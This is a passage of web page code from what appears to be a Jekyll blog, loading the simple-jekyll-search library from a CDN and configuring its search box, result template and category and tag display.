src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<center><img src="/assets/gifo.gif" alt="john"></center> ', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
